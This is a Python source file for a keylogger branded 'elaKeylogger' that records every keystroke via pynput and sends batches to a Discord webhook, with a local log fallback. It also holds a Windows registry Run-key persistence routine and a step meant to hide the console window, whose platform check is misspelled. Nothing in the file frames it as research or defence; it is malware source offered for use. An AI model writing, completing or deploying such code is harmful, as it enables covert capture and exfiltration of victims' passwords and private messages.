import threading
import queue
import time
import requests
import sys
from datetime import datetime
from pynput import keyboard

WEBHOOK_URL = ""
BATCH_INTERVAL = 10     # seconds between sends
MAX_BATCH_SIZE = 50     # keystrokes per batch
LOG_FILE = "keylog.txt" # local fallback

key_queue = queue.Queue()
running = True

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke = key.char
        else:
            special_map = {
                keyboard.Key.space: ' [SPACE] ',
                keyboard.Key.enter: ' [ENTER]\n',
                keyboard.Key.shift: ' [SHIFT] ',
                keyboard.Key.ctrl_l: ' [CTRL_L] ',
                keyboard.Key.ctrl_r: ' [CTRL_R] ',
                keyboard.Key.alt_l: ' [ALT_L] ',
                keyboard.Key.alt_r: ' [ALT_R] ',
                keyboard.Key.cmd: ' [CMD] ',
                keyboard.Key.esc: ' [ESC] ',
                keyboard.Key.backspace: ' [BACKSPACE] ',
                keyboard.Key.delete: ' [DELETE] ',
                keyboard.Key.tab: ' [TAB] ',
                keyboard.Key.caps_lock: ' [CAPS_LOCK] ',
                keyboard.Key.f1: ' [F1] ', keyboard.Key.f2: ' [F2] ',
                keyboard.Key.f3: ' [F3] ', keyboard.Key.f4: ' [F4] ',
                keyboard.Key.f5: ' [F5] ', keyboard.Key.f6: ' [F6] ',
                keyboard.Key.f7: ' [F7] ', keyboard.Key.f8: ' [F8] ',
                keyboard.Key.f9: ' [F9] ', keyboard.Key.f10: ' [F10] ',
                keyboard.Key.f11: ' [F11] ', keyboard.Key.f12: ' [F12] ',
                keyboard.Key.up: ' [UP] ', keyboard.Key.down: ' [DOWN] ',
                keyboard.Key.left: ' [LEFT] ', keyboard.Key.right: ' [RIGHT] ',
                keyboard.Key.page_up: ' [PGUP] ', keyboard.Key.page_down: ' [PGDN] ',
                keyboard.Key.home: ' [HOME] ', keyboard.Key.end: ' [END] ',
                keyboard.Key.insert: ' [INSERT] ',
                keyboard.Key.menu: ' [MENU] ',
                keyboard.Key.num_lock: ' [NUM_LOCK] ',
                keyboard.Key.scroll_lock: ' [SCROLL_LOCK] ',
                keyboard.Key.pause: ' [PAUSE] ',
                keyboard.Key.print_screen: ' [PRTSCR] ',
            }
            keystroke = special_map.get(key, f' [{str(key)}] ')
        key_queue.put(keystroke)
    except Exception as e:
        pass

def black_worker():
    buffer = []
    last_send = time.time()

    while running or not key_queue.empty():
        try:
            item = key_queue.get(timeout=1)
            buffer.append(item)
        except queue.Empty:
            pass

        now = time.time()
        if (len(buffer) >= MAX_BATCH_SIZE or (now - last_send) >= BATCH_INTERVAL) and buffer:
            payload = build_payload(buffer)
            send_to_discord(payload)
            buffer.clear()
            last_send = now

        time.sleep(0.1)

    if buffer:
        payload = build_payload(buffer)
        send_to_discord(payload)

def build_payload(keystrokes):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = ''.join(keystrokes)
    if len(text) > 1900:
        text = text[:1900] + "… [truncated]"
    return {
        "content": f"**keylog**\n'{timestamp}'\n```\n{text}\n```",
        "username": "elaKeylogger",
        "avatar_url": "https://i.pinimg.com/736x/7a/3d/38/7a3d3872f1126528c6cc477db4642166.jpg"
    }
def send_to_discord(payload):
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        if response.status_code != 204:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] FAILED: {payload['content']}\n")
    except Exception as e:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now()}] ERROR: {str(e)}\n")

def ensure_persistence():
    if sys.platform == 'win32':
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Elakeylogger", 0, winreg.REG_SZ, sys.executable + ' "' + __file__ + ' "')
            winreg.CloseKey(key)
        except:
            pass

def main():
    if sys.platform == 'wind32':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    sender_thread = threading.Thread(target=black_worker, daemon=True)
    sender_thread.start() 

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    global running
    running = False
    sender_thread.join(timeout=5)
    
if __name__ == "__main__":
    main()
